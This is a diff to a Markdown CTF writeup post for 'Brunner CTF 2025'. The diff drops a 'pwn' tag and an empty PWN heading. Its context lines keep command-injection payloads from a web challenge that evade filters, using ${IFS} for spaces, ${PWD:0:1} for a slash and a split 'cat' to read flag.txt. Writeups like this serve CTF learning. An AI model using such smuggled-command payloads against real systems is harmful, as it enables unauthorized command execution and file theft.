@@ -5,7 +5,6 @@ title : 'Brunner CTF 2025'
 description: "Writeup for Brunner CTF 2025 where i solved a web challenge, pwn challenge, 2 Boot2Root and some easy/medium misc challenges"
 tags:
 - web
-- pwn
 ---
 # Web
 ## Caffeine (User)
@@ -32,6 +31,3 @@ a;ls${IFS}${PWD:0:1} # To test that i really can use the slash now
 a;f=ca;l=t;$f$l${IFS}${PWD:0:1}flag.txt # which is just cat `/flat.txt`
 ```
 
-
-# PWN
-## 
